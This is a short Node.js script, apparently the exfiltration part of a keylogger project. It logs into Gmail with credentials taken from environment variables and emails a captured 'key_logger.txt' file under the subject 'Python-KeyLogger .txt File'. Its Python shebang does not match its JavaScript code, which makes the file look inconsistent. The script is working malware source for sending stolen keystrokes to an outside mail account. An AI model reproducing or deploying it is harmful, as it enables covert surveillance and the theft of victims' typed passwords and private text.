#!/usr/bin/python
var nodemailer = require('nodemailer')

require('dotenv').config() 

var transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.MAIL,
        pass: process.env.ACCESS_KEY
    }
});

var mailOptions = {
    from: 'mail@gmail.com',
    to: 'mail@gmail.com',
    subject: 'Python-KeyLogger .txt File',

    attachments: [
      {
        path: 'key_logger.txt'
      }
    ]
};


transporter.sendMail(mailOptions, function(error, info){
    if (error) {
      console.log(error)
    } else {
      console.log('Email was sent -> ' + info.response);
    }
});
